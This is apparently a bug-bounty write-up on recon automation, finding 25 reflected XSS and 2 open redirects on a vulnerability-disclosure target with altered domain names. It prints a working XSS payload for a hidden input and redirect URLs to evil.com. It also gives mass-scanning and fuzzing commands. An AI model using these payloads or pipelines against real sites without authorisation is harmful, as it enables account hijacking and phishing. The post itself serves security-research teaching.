# 6 Hours = 25 Reflected XSS and 2 Open Redirects

- **Source URL:** https://medium.com/@belalmohamed3690/6-hours-25-reflected-xss-and-2-open-redirects-0c3da54f1c0b
- **Fetched from:** https://medium.com/@belalmohamed3690/6-hours-25-reflected-xss-and-2-open-redirects-0c3da54f1c0b?source=rss-691a8ee92a78------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14954)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** belo / Tue, 20 Oct 2026 18:11:36 GMT

Like my friend [Mohamed Abdelmoatie (3at3ot)](https://medium.com/u/3747d892ef57) said, there are two types of bug hunting:

Even though I prefer type 2, this write-up is the type 1 and I found 27 bugs from it. Let’s dive into the methodology

*Note: this recon stage was automated , this program is VDP and the domains mentioned arn’t real*

Bug hunting 101: subdomain enum. Three tools into one pile, then keep whatever’s actually alive:

subfinder -all -silent -d target.com >> subs.txt

findomain -t target.com -q >> subs.txt

assetfinder --subs-only target.com >> subs.txt

sort -u subs.txt | httpx -silent -threads 50 -rate-limit 150 -timeout 10 > live.txt

Next stage is URL collection. katana crawls what’s live right now, gau and urlfinder digs through the archives

cat live.txt | katana -silent -jc -d 5 > urls.txt

cat subs.txt | gau --threads 50 --providers wayback,otx,urlscan,commoncrawl >> urls.txt

cat subs.txt | urlfinder -silent -all >> urls.txt

sort -u urls.txt | uro > urls\_clean.txt

(uro just strips near-duplicate URLs)

Now the actual XSS part. Reflected XSS lives in parameters and raw \< > " ' unfiltered. So first we grab everything with a query string, then run it through kxss:

grep -a '\?' urls\_clean.txt | sort -u > params.txt

kxss \< params.txt | grep -iE "Unfiltered:.\*\[\"'\<>\]"

kxss ([https://github.com/Emoe/kxss](https://github.com/Emoe/kxss)) is a tool that find reflections we want you just feed it urls and it spits out one line per param Unfiltered: \[" ' \< >\]

This takes a while, so I left it running and went out with friends. Came back later to a beautiful view — a pile of reflections.

After going through them one by one I had 6 XSS. Won’t walk through all of them, but three were the most interesting — same subdomain, same ck parameter:

https://free.palestine.com/PINS001\_DAB4F\_ENS?ck=HERE"

https://free.palestine.com/PROA011\_DAA3T\_ENS?ck=HERE"

https://free.palestine.com/PROP008\_DAF7F\_ENS?ck=HERE"

Reflection point:

\<input type="hidden" value="HERE"">

\<> are filtered and can’t just throw " autofocus onfocus=alert(1) x=" at this one, because it’s a hidden input and hidden fields can never take focus i popped an alert using:

`<input type="hidden" value="" oncontentvisibilityautostatechange="alert('hacked by belo')" style="content-visibility:auto" x="">`
content-visibility: auto dont know what even is this i saw it on portswigger and an event that fires when this thing is auto oncontentvisibilityautostatechange easy to understand it’s pretty self-explanatory read it one more time.

works on chrome only btw

If you already know where this is going, you’ve got bug hunter eyes. If not, no worries.

Noticed the three endpoints before take another look at them they looked sequential numbered, with a trailing alphanumeric chunk. First move: Google dork the pattern they all have the same words in the page and in the url PINS, PROA and PROP i think they are campaign thing.

`site:free.palestine ("PINS" OR "PROA" OR "PROP")`
Next i collected every URL matching those prefixes in the urls from gau again and ran them through arjun to fuzz for parameters, since not all of them used the same ck param — the reflection point was the same, but the parameter name wasn’t always:

gau free.palestine.com | grep -iE 'PINS|PROA|PROP' > collected.txt

arjun --stable -w \~/Seclist/params -i collected.txt

That got me more XSS with same vulnrable hidden input reflection now confirmed the pattern of the vulnrable endpoints shape:

```
{KNOWN1}{NNN}_DA{KNOWN2}_ENS
  
KNOWN1 in (PINS, PROA, PROP) 
NNN in 000-999
KNOWN2 in (J2P,GB9,C0C,L58,...) 3 capital letter + numbers
```
The number (NNN) was the only truly unknown piece — that’s the one needing a 000–999 brute force. KNOWN1 was just the three prefixes (PINS, PROA, PROP) and KNOWN2 was the list of 3 capital letter + numbers collected from the endpoints we already found. Three wordlists into ffuf clusterbomb mode:

ffuf -w known1.txt:PFX -w nums.txt:NUM -w known2.txt:LET \

-u "https://free.palestine.com/PFXNUM\_DALET\_ENS" -ac

Kept recognizing more patterns, kept brute-forcing, and landed on 25 confirmed Reflected XSS total. That’s the whole point of pattern recognition.

Easy one — while going through those XSS hits I ran into:

https://free2.palestine.com/sso/?redirect=https%3A%2F%2Ffree2.palestine.com.evil.com

Redirected straight to free2.palestine.com.evil.com Remembered a similar-looking subdomain, tried the same param on it and it also vulnrable:

https://free2-preprod.palestine.com/sso/?redirect=https%3A%2F%2Ffree2-preprod.palestine.com.evil.com

Total: 27 bugs and would have been 7 without pattern recognition whenever you find a bug search for it somewhere else sure you will find
